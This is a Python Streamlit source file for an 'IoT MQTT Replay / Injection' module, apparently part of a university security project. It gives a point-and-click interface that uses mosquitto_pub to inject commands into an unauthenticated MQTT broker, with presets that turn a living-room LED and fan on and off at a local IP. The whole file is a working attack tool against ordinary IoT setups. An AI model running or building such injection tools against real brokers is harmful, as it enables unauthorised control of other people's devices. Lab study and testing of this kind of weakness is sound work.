import streamlit as st
import shutil
from utils import run_command

st.set_page_config(page_title="IoT Replay Attack", page_icon="📡")

st.header("📡 IoT MQTT Replay / Injection")
st.markdown("This module exploits **Unauthenticated MQTT Brokers**. It injects commands into the target topic, simulating a replay attack where an attacker mimics a legitimate controller.")

# --- CHECK DEPENDENCY ---
if shutil.which("mosquitto_pub") is None:
    st.error("❌ 'mosquitto_pub' is not found. Install it using: `sudo apt install mosquitto-clients`")
    st.stop()

# --- PRESETS ---
# Dictionary to hold your specific university project targets
presets = {
    "Custom / Manual": {"topic": "", "msg": ""},
    "Living Room LED (ON)": {"topic": "home/livingroom/led/set", "msg": "ON"},
    "Living Room LED (OFF)": {"topic": "home/livingroom/led/set", "msg": "OFF"},
    "Living Room Fan (ON)": {"topic": "home/livingroom/fan/set", "msg": "ON"},
    "Living Room Fan (OFF)": {"topic": "home/livingroom/fan/set", "msg": "OFF"},
}

# --- INPUT SECTION ---
st.subheader("Target Configuration")

col1, col2 = st.columns(2)
with col1:
    target_ip = st.text_input("Broker IP (ESP32/Server)", "192.168.88.252")
with col2:
    selected_preset = st.selectbox("Load Preset", list(presets.keys()))

# Load values based on preset
default_topic = presets[selected_preset]["topic"]
default_msg = presets[selected_preset]["msg"]

col3, col4 = st.columns(2)
with col3:
    topic = st.text_input("MQTT Topic", value=default_topic, help="e.g., home/livingroom/led/set")
with col4:
    message = st.text_input("Message Payload", value=default_msg, help="e.g., ON, OFF, or JSON data")

# --- EXECUTION ---
if st.button("📡 Replay Signal"):
    if not target_ip or not topic or not message:
        st.error("⚠️ Missing IP, Topic, or Message.")
        st.stop()

    # Construct the command
    # Syntax: mosquitto_pub -h <IP> -t <TOPIC> -m <MESSAGE>
    command = [
        "mosquitto_pub",
        "-h", target_ip,
        "-t", topic,
        "-m", message
    ]

    st.info(f"Injecting payload '{message}' into topic '{topic}'...")
    run_command(command)
